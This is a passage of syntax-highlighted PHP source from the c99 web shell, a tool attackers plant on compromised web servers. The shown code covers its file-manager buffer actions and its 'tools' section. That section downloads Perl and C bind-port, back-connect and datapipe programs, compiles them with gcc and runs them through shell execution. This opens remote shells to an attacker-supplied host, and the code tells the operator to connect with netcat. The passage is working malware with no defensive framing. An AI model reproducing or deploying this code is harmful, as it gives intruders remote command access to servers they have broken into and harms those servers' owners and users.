<span class="s2">  &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">button</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">ls_setcheckboxall(1);</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Select all</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">button</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">ls_setcheckboxall(0);</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Unselect all</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">],</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]))</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$usefsbuff</span><span class="p">))</span>
  <span class="p">{</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=submit name=actarcbuff value=</span><span class="se">\&quot;</span><span class="s2">Pack buffer to archive</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actarcbuff_path</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">archive_&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">)),</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.tar.gz</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;input type=submit name=</span><span class="se">\&quot;</span><span class="s2">actpastebuff</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Paste</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;input type=submit name=</span><span class="se">\&quot;</span><span class="s2">actemptybuff</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Empty buffer</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;select name=act&amp;gt;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$act</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;With selected:&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=delete&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$dspact</span> <span class="o">==</span> <span class="s2">&quot;delete&quot;</span><span class="o">?</span><span class="s2">&quot; selected&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;Delete&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=chmod&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$dspact</span> <span class="o">==</span> <span class="s2">&quot;chmod&quot;</span><span class="o">?</span><span class="s2">&quot; selected&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;Change-mode&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$usefsbuff</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=cut&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$dspact</span> <span class="o">==</span> <span class="s2">&quot;cut&quot;</span><span class="o">?</span><span class="s2">&quot; selected&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;Cut&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=copy&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$dspact</span> <span class="o">==</span> <span class="s2">&quot;copy&quot;</span><span class="o">?</span><span class="s2">&quot; selected&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;Copy&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=unselect&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$dspact</span> <span class="o">==</span> <span class="s2">&quot;unselect&quot;</span><span class="o">?</span><span class="s2">&quot; selected&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;Unselect&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;nbsp;&amp;lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">Confirm</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/p&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;tools&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$bndportsrcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;c99sh_bindport.pl&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;Using PERL&quot;</span><span class="p">,</span><span class="s2">&quot;perl %path %port&quot;</span><span class="p">),</span>
  <span class="s2">&quot;c99sh_bindport.c&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;Using C&quot;</span><span class="p">,</span><span class="s2">&quot;%path %port %pass&quot;</span><span class="p">)</span>
 <span class="p">);</span>
 <span class="nv">$bcsrcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;c99sh_backconn.pl&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;Using PERL&quot;</span><span class="p">,</span><span class="s2">&quot;perl %path %host %port&quot;</span><span class="p">),</span>
  <span class="s2">&quot;c99sh_backconn.c&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;Using C&quot;</span><span class="p">,</span><span class="s2">&quot;%path %host %port&quot;</span><span class="p">)</span>
 <span class="p">);</span>
 <span class="nv">$dpsrcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;c99sh_datapipe.pl&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;Using PERL&quot;</span><span class="p">,</span><span class="s2">&quot;perl %path %localport %remotehost %remoteport&quot;</span><span class="p">),</span>
  <span class="s2">&quot;c99sh_datapipe.c&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;Using C&quot;</span><span class="p">,</span><span class="s2">&quot;%path %localport %remoteport %remotehost&quot;</span><span class="p">)</span>
 <span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$bind</span><span class="p">))</span> <span class="p">{</span><span class="nv">$bind</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$bc</span><span class="p">))</span> <span class="p">{</span><span class="nv">$bc</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$datapipe</span><span class="p">))</span> <span class="p">{</span><span class="nv">$datapipe</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>

 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$bindport_port</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;pass&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;pass&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$bindport_pass</span><span class="p">;}</span>

 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;host&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;host&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">);}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$bc_port</span><span class="p">;}</span>

 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;remoteaddr&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;remoteaddr&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;irc.dalnet.ru:6667&quot;</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;localport&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;localport&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$datapipe_localport</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$bindsubmit</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Result of binding port:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
  <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$bndportsrcs</span><span class="p">[</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">]];</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Unknown file!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nb">fsockopen</span><span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">),</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">],</span><span class="nv">$errno</span><span class="p">,</span><span class="nv">$errstr</span><span class="p">,</span><span class="mf">0.1</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Port alredy in use, select any other!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">else</span>
  <span class="p">{</span>
   <span class="nv">$w</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">]);</span>
   <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$w</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
   <span class="nb">unset</span><span class="p">(</span><span class="nv">$w</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]);</span>
   <span class="nv">$srcpath</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$w</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">999</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
   <span class="nv">$binpath</span> <span class="o">=</span> <span class="nv">$tmpdir</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$w</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">999</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$ext</span> <span class="o">==</span> <span class="s2">&quot;pl&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$binpath</span> <span class="o">=</span> <span class="nv">$srcpath</span><span class="p">;}</span>
   <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$srcpath</span><span class="p">);</span>
   <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$srcpath</span><span class="p">,</span><span class="s2">&quot;ab+&quot;</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t write sources to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$srcpath</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span> <span class="o">=</span> <span class="nx">c99getsource</span><span class="p">(</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t download sources!&quot;</span><span class="p">;}</span>
   <span class="k">else</span>
   <span class="p">{</span>
    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$data</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$ext</span> <span class="o">==</span> <span class="s2">&quot;c&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$retgcc</span> <span class="o">=</span> <span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;gcc -o &quot;</span><span class="o">.</span><span class="nv">$binpath</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$srcpath</span><span class="p">);</span>  <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$srcpath</span><span class="p">);}</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%path&quot;</span><span class="p">,</span><span class="nv">$binpath</span><span class="p">,</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%port&quot;</span><span class="p">,</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">],</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%pass&quot;</span><span class="p">,</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;pass&quot;</span><span class="p">],</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$retbind</span> <span class="o">=</span> <span class="nx">myshellexec</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;gt; /dev/null &amp;&quot;</span><span class="p">);</span>
    <span class="nb">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
    <span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">],</span><span class="nv">$errno</span><span class="p">,</span><span class="nv">$errstr</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;I can&#39;t connect to localhost:&quot;</span><span class="o">.</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;! I think you should configure your firewall.&quot;</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Binding... ok! Connect to &amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;! You should use NetCat&amp;copy;, run </span><span class="se">\&quot;</span><span class="s2">&amp;lt;b&amp;gt;nc -v &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$bind</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;</span><span class="se">\&quot;</span><span class="s2">!&amp;lt;center&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;processes&#39;;document.todo.grep.value=&#39;&quot;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$binpath</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;View binder&#39;s process&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="p">}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$bcsubmit</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Result of back connection:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
  <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$bcsrcs</span><span class="p">[</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">]];</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Unknown file!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">else</span>
  <span class="p">{</span>
   <span class="nv">$w</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">]);</span>
   <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$w</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
   <span class="nb">unset</span><span class="p">(</span><span class="nv">$w</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]);</span>
   <span class="nv">$srcpath</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$w</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">999</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
   <span class="nv">$binpath</span> <span class="o">=</span> <span class="nv">$tmpdir</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$w</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">999</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$ext</span> <span class="o">==</span> <span class="s2">&quot;pl&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$binpath</span> <span class="o">=</span> <span class="nv">$srcpath</span><span class="p">;}</span>
   <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$srcpath</span><span class="p">);</span>
   <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$srcpath</span><span class="p">,</span><span class="s2">&quot;ab+&quot;</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t write sources to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$srcpath</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span> <span class="o">=</span> <span class="nx">c99getsource</span><span class="p">(</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t download sources!&quot;</span><span class="p">;}</span>
   <span class="k">else</span>
   <span class="p">{</span>
    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$data</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$ext</span> <span class="o">==</span> <span class="s2">&quot;c&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$retgcc</span> <span class="o">=</span> <span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;gcc -o &quot;</span><span class="o">.</span><span class="nv">$binpath</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$srcpath</span><span class="p">);</span> <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$srcpath</span><span class="p">);}</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%path&quot;</span><span class="p">,</span><span class="nv">$binpath</span><span class="p">,</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%host&quot;</span><span class="p">,</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;host&quot;</span><span class="p">],</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%port&quot;</span><span class="p">,</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">],</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="nv">$retbind</span> <span class="o">=</span> <span class="nx">myshellexec</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;gt; /dev/null &amp;&quot;</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;Now script try connect to &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;host&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$bc</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;...&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
   <span class="p">}</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$dpsubmit</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Result of datapipe-running:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
  <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$dpsrcs</span><span class="p">[</span><span class="nv">$datapipe</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">]];</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Unknown file!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
